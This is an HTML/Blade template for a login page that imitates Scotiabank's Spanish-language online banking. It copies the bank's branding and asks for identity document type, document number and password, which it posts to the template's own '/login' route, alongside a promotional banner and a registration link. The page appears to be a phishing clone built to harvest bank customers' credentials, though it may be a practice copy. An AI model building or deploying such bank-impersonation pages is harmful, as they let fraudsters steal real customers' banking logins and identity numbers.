<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Scotiabank - Iniciar Sesión</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
        .animate-blink { animation: blink 1.5s infinite; }
    </style>
</head>
<body class="h-screen w-full flex bg-[#F4F4F4]">
    <div class="w-full md:w-[480px] bg-white p-10 flex flex-col justify-center shadow-2xl z-20 overflow-y-auto">
        <div class="mb-8">
            <div class="text-red-600 font-extrabold text-3xl tracking-tight flex items-center">
                <span class="bg-red-600 text-white rounded-full w-8 h-8 flex items-center justify-center text-xl mr-2 font-serif">S</span>
                Scotiabank<span class="text-red-600 text-xs align-top mt-1">®</span>
            </div>
        </div>
       
        <h1 class="text-3xl font-bold mb-2 text-gray-900">Inicia sesión</h1>
        <p class="text-gray-500 mb-6 text-sm">Ingresa tus datos para acceder a tu banca por internet.</p>

        @if(Session::has('error'))
            <div class="bg-red-50 border-l-4 border-red-500 text-red-700 p-4 mb-6 text-xs font-semibold animate-blink rounded">
                {{ Session::get('error') }}
            </div>
        @endif

        <form method="POST" action="/login" class="space-y-6">
            @csrf
            
            <div class="flex flex-col border-b-2 border-gray-200 focus-within:border-[#EC111A] transition-all pb-1">
                <label class="text-[10px] uppercase font-bold text-gray-400 tracking-widest">Tipo de documento</label>
                <select name="tipo_doc" class="w-full bg-transparent py-1 outline-none text-gray-700 font-medium cursor-pointer">
                    <option value="DNI">DNI</option>
                    <option value="CE">Carné de Extranjería</option>
                    <option value="RUC">RUC</option>
                    <option value="PAS">Pasaporte</option>
                    <option value="PTP">Permiso Temporal de Permanencia</option>
                    <option value="FFPP">Carné FF.PP.</option>
                    <option value="FFAA">Carné FF.AA.</option>
                </select>
            </div>

            <div class="flex flex-col border-b-2 border-gray-200 focus-within:border-[#EC111A] transition-all pb-1">
                <label class="text-[10px] uppercase font-bold text-gray-400 tracking-widest">Número de documento</label>
                <input type="text" name="documento" required placeholder="Ingresar dato" class="w-full bg-transparent py-1 outline-none text-gray-700">
            </div>

            <div class="flex flex-col border-b-2 border-gray-200 focus-within:border-[#EC111A] transition-all pb-1">
                <label class="text-[10px] uppercase font-bold text-gray-400 tracking-widest">Contraseña</label>
                <input type="password" name="password" required placeholder="Ingresa tu contraseña" class="w-full bg-transparent py-1 outline-none text-gray-700">
            </div>

            <div class="flex items-center justify-between">
                <div class="flex items-center space-x-2 group relative">
                    <input type="checkbox" id="confiar" name="confiar" class="w-4 h-4 text-[#EC111A] border-gray-300 rounded focus:ring-[#EC111A]">
                    <label for="confiar" class="text-sm text-gray-600 flex items-center cursor-pointer">
                        Confiar 
                        <svg class="w-4 h-4 ml-1 text-gray-400" fill="currentColor" viewBox="0 0 20 20"><path d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z"></path></svg>
                    </label>
                    <div class="hidden group-hover:block absolute bottom-full mb-2 w-64 bg-gray-800 text-white text-[10px] p-2 rounded shadow-lg z-50">
                        Al activar esta opción podrás iniciar sesión sin la Clave Digital. Siempre utilizarás tu contraseña.
                    </div>
                </div>
                <a href="#" class="text-[#0082c3] text-sm font-semibold hover:underline">Recuperar contraseña</a>
            </div>

            <button type="submit" class="w-full bg-[#EC111A] text-white font-bold py-4 rounded shadow-lg hover:bg-red-700 transition-all uppercase tracking-widest mt-4">
                Ingresar
            </button>
        </form>

        <div class="mt-8 p-4 border border-dashed border-gray-200 rounded-lg bg-gray-50 flex items-center space-x-4">
            <div class="bg-blue-100 p-2 rounded-full text-[#0082c3]">
                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18 9v3m0 0v3m0-3h3m-3 0h-3m-2-5a4 4 0 11-8 0 4 4 0 018 0zM3 20a6 6 0 0112 0v1H3v-1z"></path></svg>
            </div>
            <div>
                <p class="text-[11px] font-bold text-gray-700">¿Es tu primera vez aquí?</p>
                <a href="/register" class="text-[#0082c3] text-[11px] font-black uppercase hover:underline">Registrarse</a>
            </div>
        </div>
    </div>

    <div class="hidden md:flex flex-1 bg-cover bg-center relative" style="background-image: url('https://images.unsplash.com/photo-1563986768609-322da13575f3?auto=format&fit=crop&q=80');">
        <div class="absolute inset-0 bg-black/40"></div>
        
        <div class="relative z-10 p-20 flex flex-col justify-center max-w-2xl">
            <h2 class="text-5xl font-black text-white leading-tight mb-8">Abre tu Cuenta Digital y gana S/ 50 sin sorteos.</h2>
            <div class="space-y-4 text-white">
                <div class="flex items-center space-x-3">
                    <svg class="w-6 h-6 text-green-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M5 13l4 4L19 7"></path></svg>
                    <p class="text-xl font-medium">Sin costo de mantenimiento.</p>
                </div>
                <div class="flex items-center space-x-3">
                    <svg class="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z"></path></svg>
                    <p class="text-xl font-medium">Transferencias interbancarias gratis.</p>
                </div>
            </div>
        </div>
    </div>
</body>
</html>